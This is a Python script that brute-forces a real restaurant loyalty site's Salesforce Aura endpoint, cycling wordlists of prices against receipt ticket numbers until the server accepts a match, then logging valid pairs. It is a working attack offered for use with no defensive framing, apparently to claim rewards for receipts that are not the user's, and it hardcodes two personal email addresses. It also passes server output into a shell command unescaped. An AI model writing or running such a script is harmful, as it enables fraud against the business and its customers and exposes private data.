import requests, re, os, time
url = "https://www.goikofriends.com/QR/aura?r=0&aura.ApexAction.execute=1"
def clear():
 os.system('cls || clear')
r = requests.session()
r.get(url)
choice = int(input("1: Brute force 1 ticket\n"
                "2: Brute force tickets from a ticket diccionary  "))


def brute_force(ticket):
    prices = open('menu_personalized.txt', 'r', encoding='UTF-8')
    for price in prices:
        price = price.strip('\n')
        data = {
            'message' : '{"actions":[{"id":"2;a","descriptor":"aura://ApexActionController/ACTION$execute","callingDescriptor":"UNKNOWN","params":{"namespace":"","classname":"R3_CLS_RegistrationHomePage_CTRL","method":"saveParticipante","params":{"personEmail":"sofsan2003@gmail.com","ticketCompra":"%s","precioPedido":"%s","localId":"37720"},"cacheable":false,"isContinuation":false}}]}' %(ticket, price),
            'aura.context' : '{"mode":"PROD","fwuid":"QPQi8lbYE8YujG6og6Dqgw","app":"c:LightningOutApp","loaded":{"APPLICATION@markup://c:LightningOutApp":"8NJanl9k5lwJ75NQBv8HUQ"},"dn":[],"globals":{},"uad":true}',
            'aura.pageURI' : '/QR?receiptId=110470',
            'companyId' : '37720',
            'aura.token' : 'null'
        }
        print("Trying with price " + price + " on ticket " + ticket)
        response = r.post(url, data=data)
        message = re.findall('"message":"(.*?)"', response.text)
        message = message[0]
        time.sleep(2.5)
        #print(message)
        if "El total no coincide con el recibo" not in message:
            print("Precio valido: " + price + " para el ticket " + ticket)
            print("Output del servidor: " + message)
            os.system('echo {} : {} : {}>> checked.txt' .format(price, ticket, message))
            break
        clear()
if choice == 1:
    prices = open('min10eprices.txt', 'r', encoding='UTF-8')
    for price in prices:
        price = price.strip('\n')
        ticket = "110768"
        data = {
            'message' : '{"actions":[{"id":"2;a","descriptor":"aura://ApexActionController/ACTION$execute","callingDescriptor":"UNKNOWN","params":{"namespace":"","classname":"R3_CLS_RegistrationHomePage_CTRL","method":"saveParticipante","params":{"personEmail":"davidmoreno.u@hotmail.es","ticketCompra":"%s","precioPedido":"%s","localId":"37720"},"cacheable":false,"isContinuation":false}}]}' %(ticket, price),
            'aura.context' : '{"mode":"PROD","fwuid":"QPQi8lbYE8YujG6og6Dqgw","app":"c:LightningOutApp","loaded":{"APPLICATION@markup://c:LightningOutApp":"8NJanl9k5lwJ75NQBv8HUQ"},"dn":[],"globals":{},"uad":true}',
            'aura.pageURI' : '/QR?receiptId=110470',
            'companyId' : '37720',
            'aura.token' : 'null'
        }
        print("Trying with price " + price)
        response = r.post(url, data=data)
        message = re.findall('"message":"(.*?)"', response.text)
        message = message[0]
        print(message)
        if "El total no coincide con el recibo" not in message:
            print("Precio valido: " + price + " para el ticket " + ticket)
            print("Output del servidor: " + message)
            break
        
        clear()

elif choice == 2:
    tickets = open('tickets.txt', 'r', encoding='UTF-8')
    
    for ticket in tickets:
        ticket = ticket.strip('\n')
        brute_force(ticket)
      